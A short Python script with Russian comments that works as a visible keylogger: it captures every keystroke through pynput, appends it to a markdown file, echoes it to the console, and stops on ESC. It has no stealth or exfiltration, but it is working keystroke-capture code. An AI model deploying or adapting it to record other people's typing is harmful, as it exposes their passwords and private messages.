"""
Логгер клавиш. Пишет всё в keys.md
Запуск: python keylogger.py
Выход: ESC
"""

from pynput import keyboard
from datetime import datetime

LOG_FILE = "keys.md"


def init_log():
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n---\n## Сессия {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")


def log_key(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)


def on_press(key):
    try:
        text = key.char
        log_key(text)
        print(text, end="", flush=True)
    except AttributeError:
        if key == keyboard.Key.space:
            log_key(" ")
            print(" ", end="", flush=True)
        elif key == keyboard.Key.enter:
            log_key("\n")
            print("", flush=True)
        elif key == keyboard.Key.backspace:
            log_key(" [BS] ")
            print(" [BS] ", end="", flush=True)
        else:
            log_key(f" [{key.name}] ")
            print(f" [{key.name}] ", end="", flush=True)


def on_release(key):
    if key == keyboard.Key.esc:
        log_key("\n\n*[ESC — конец сессии]*\n")
        print("\n[!] Выход. Лог сохранён в keys.md")
        return False


if __name__ == "__main__":
    init_log()
    print(f"Кейлоггер запущен. Пишу в {LOG_FILE}. ESC — выход.\n")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
